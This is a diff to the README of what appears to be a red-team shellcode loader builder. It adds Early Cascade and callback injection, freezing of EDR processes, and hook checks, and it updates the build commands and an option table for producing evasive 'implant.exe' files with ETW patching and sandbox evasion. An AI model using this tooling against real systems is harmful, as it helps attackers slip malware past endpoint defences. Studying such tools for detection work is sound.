@@ -10,7 +10,11 @@
 
 - **Direct & Indirect Syscalls** — Hell's Gate / HookChain-style SSN resolution
 - **Multiple NTDLL Resolvers** — PEB walk, fresh disk copy, or hybrid
-- **Injection Methods** — Module Stomping, Early Bird APC, Remote Thread (NtCreateThreadEx), Process Hollowing, Section Mapping
+- **Injection Methods** — Module Stomping, Early Bird APC, Remote Thread (NtCreateThreadEx), Process Hollowing, Section Mapping, Thread Pool, Early Cascade, Callback Execution
+- **Early Cascade Injection** — Shim Engine `g_pfnSE_DllLoaded` hijack with AppVerifier `AvrfpAPILookupCallbackRoutine` fallback
+- **Callback Execution** — 7 callback methods (EnumCalendarInfoA, CertEnumSystemStore, EnumChildWindows, CreateFiber, EnumResourceTypesA, CryptEnumOIDInfo, SetTimer), randomly selected per build for unique signatures
+- **EDR Process Freezing** — DJB2 hash-based identification + NtSuspendProcess via indirect syscall (zero plaintext strings in binary)
+- **Hook Integrity Verification** — Post-injection syscall stub check for EDR hooks
 - **Multi-Layer Encryption** — XOR, AES-256-CBC, or cascade (both)
 - **Shellcode Encoding** — UUID, MAC address, IPv4, or raw formats
 - **String Obfuscation** — DJB2 hashing, XOR, stack strings, or none
@@ -35,11 +39,14 @@
 # Install Python dependencies
 pip install -r requirements.txt
 
-# Basic build (shellcode → implant)
+# Default build now uses Early Cascade injection
 python run.py -i payload.bin -o implant.exe
 
-# Stealth build: indirect syscalls, cascade encryption, UUID encoding, early bird injection
-python run.py -i payload.bin -o implant.exe --syscall indirect --encrypt cascade --encode uuid --inject earlybird
+# Full stealth build: indirect syscalls, cascade encryption, UUID encoding, early cascade injection, EDR freeze
+python run.py -i payload.bin -o implant.exe --syscall indirect --encrypt cascade --encode uuid --inject earlycascade --edr-freeze
+
+# Callback-based local execution (method randomly selected at build time)
+python run.py -i payload.bin -o implant.exe --inject callback
 
 # Remote thread injection into notepad.exe
 python run.py -i payload.bin -o implant.exe --inject remotethread --target notepad.exe
@@ -48,7 +55,7 @@ python run.py -i payload.bin -o implant.exe --inject remotethread --target notep
 python run.py -i payload.bin --no-compile
 
 # Save and reuse a profile
-python run.py --save-profile stealth --syscall indirect --inject earlybird --encrypt cascade
+python run.py --save-profile stealth --syscall indirect --inject earlycascade --encrypt cascade
 python run.py -i payload.bin -o implant.exe --profile stealth
 ```
 
@@ -79,12 +86,13 @@ The builder generates a self-contained C++ project (syscalls, resolver, injectio
 | `--strings` | `none`, `djb2`, `xor`, `stack` | `djb2` | String obfuscation method |
 | `--encrypt` | `xor`, `aes`, `cascade` | `cascade` | Shellcode encryption |
 | `--encode` | `uuid`, `mac`, `ipv4`, `raw` | `uuid` | Shellcode encoding format |
-| `--inject` | `stomp`, `earlybird`, `remotethread`, `hollowing`, `mapping` | `earlybird` | Injection technique |
+| `--inject` | `stomp`, `earlybird`, `remotethread`, `hollowing`, `mapping`, `threadpool_real`, `earlycascade`, `callback` | `earlycascade` | Injection technique |
 | `--target` | process name | `notepad.exe` | Target process |
 | `--sleep` | seconds | `0` | Initial sleep before execution |
 | `--sandbox` / `--no-sandbox` | — | enabled | Sandbox / VM evasion checks |
 | `--etw` / `--no-etw` | — | enabled | ETW patching |
 | `--unhook` | — | disabled | NTDLL unhooking |
+| `--edr-freeze` | — | disabled | Freeze EDR processes (requires admin) |
 | `--debug` | — | disabled | Verbose debug output |
 
 ---
